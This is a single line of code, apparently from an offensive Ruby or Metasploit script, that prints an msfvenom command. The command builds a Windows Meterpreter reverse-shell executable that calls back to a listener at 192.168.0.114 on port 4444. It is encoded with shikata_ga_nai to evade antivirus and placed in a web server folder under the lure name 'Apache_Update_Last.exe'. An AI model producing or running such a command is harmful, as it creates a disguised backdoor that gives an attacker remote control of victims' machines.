print_status("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.114 LPORT=4444 -b \x00 -e x86/shikata_ga_nai -f exe -o /var/www/html/Apache_Update_Last.exe")
